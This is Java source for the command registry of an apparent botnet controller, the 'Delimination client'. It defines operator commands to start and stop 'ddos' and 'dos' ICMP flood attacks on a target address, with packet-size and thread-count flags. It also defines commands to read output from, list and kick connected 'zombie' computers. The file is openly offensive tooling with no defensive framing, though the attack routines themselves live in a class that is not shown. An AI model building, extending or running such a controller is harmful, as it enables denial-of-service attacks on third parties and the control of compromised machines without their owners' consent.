package org.ddos.client.command;

import org.ddos.network.ClientNetwork;
import org.jcom.Command;
import org.jcom.CommandCompletionListener;
import org.jcom.CommandData;
import org.jcom.CommandException;
import org.jcom.CommandExecutionListener;
import org.jcom.CommandInterface;
import org.jcom.CommandInterruptedException;
import org.jcom.FlagData;
import org.jcom.InvalidCommandArgumentsException;
import org.jcom.UnknownCommandException;
import org.jcom.UnknownFlagException;
import org.jnetwork.DataPackage;

public class ClientCommands {
	private CommandInterface commands = new CommandInterface();

	public ClientCommands() {
		commands.addCommandExecutionListener(new CommandExecutionListener() {
			@Override
			public void commandExecuted(Command c, CommandData d) {
				if (!c.getBaseCommand().equals("refresh")) {
					try {
						commands.executeCommand("refresh");
					} catch (CommandException e) {
						// who gives a frick
					}
				}
			}
		});
		commands.addCommandCompletionListener(new CommandCompletionListener() {
			@Override
			public void commandCompleted(Command c, CommandData d) {
				try {
					if (c.getBaseCommand().equals("readzombie")) {
						ClientNetwork.getClient().getOutputStream().writeObject(
								new DataPackage(c.getCommandArguments()[0]).setMessage("STOP_READ_ZOMBIE"));
					} else if (c.getBaseCommand().equals("readserver")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("STOP_READ_SERVER"));
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		commands.putCommand("ddos",
				new CommandData("ddos [start|stop] <address> {-l size, -t threads, -v valid}",
						"Starts or stops an attack on address.", 2, CommandActions.getDdosAction(),
						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
		commands.putCommand("readzombie",
				new CommandData("readzombie <address>",
						"Continuously reads the output from a zombie computer until the command is exited.", 1,
						CommandActions.getReadFromZombieAction()));
		commands.putCommand("readserver",
				new CommandData("readserver",
						"Continuously reads the output from the server until the command is exited.", 0,
						CommandActions.getReadFromServerAction()));
		commands.putCommand("dos",
				new CommandData("dos [start|stop] <address> {-l size, -t threads, -v valid}",
						"Starts or stops an attack on address, where all pinging threads are ran on the local machine.",
						2, CommandActions.getDosAction(),
						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
						new FlagData("-v", "Checks if the address is valid before the DoS starts.")));
		commands.putCommand("kick",
				new CommandData("kick",
						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
						CommandActions.getKickAllZombiesAction()),
				new CommandData("kick <address...>",
						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
						-1, CommandActions.getKickAction()));
		commands.putCommand("list",
				new CommandData("list {-a all}", "Gets the IP addresses of all zombies connected to the server.", 0,
						CommandActions.getListZombiesAction(), new FlagData("-a",
								"Gets the IP addresses of all computers connected to the server, including clients.")));
		commands.putCommand("refresh",
				new CommandData("refresh", "Removes all of the disconected zombies off of the server.", 0,
						CommandActions.getRemoveDeadZombiesAction()));
		commands.putCommand("help",
				new CommandData("help", "Lists all commands and their usage.", 0,
						CommandActions.getUniversalHelpAction()),
				new CommandData("help <command>", "Gets help for the specified command.", 1,
						CommandActions.getHelpForCommandAction()));
		commands.putCommand("ping", new CommandData("ping <address>", "Pings the given address four times.", 1,
				CommandActions.getPingAction()));
		commands.putCommand("wait",
				new CommandData("wait", "Waits until the user stops the command.", 0, CommandActions.getWaitAction()),
				new CommandData("wait <time>", "Waits for a given amount of milliseconds.", 1,
						CommandActions.getWaitForMillisecondsAction()));
		commands.putCommand("valid", new CommandData("valid <address>", "Gets if the given IP address exists.", 1,
				CommandActions.getValidAddressAction()));
		commands.putCommand("exit", new CommandData("exit", "Exits the Delimination client.", 0,
				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
	}

	public void executeCommand(Command command) throws UnknownCommandException, InvalidCommandArgumentsException,
			CommandInterruptedException, UnknownFlagException {
		commands.executeCommand(command);
	}

	public CommandData[] getCommandData(String baseCommand) throws UnknownCommandException {
		return commands.getCommandData(baseCommand);
	}
}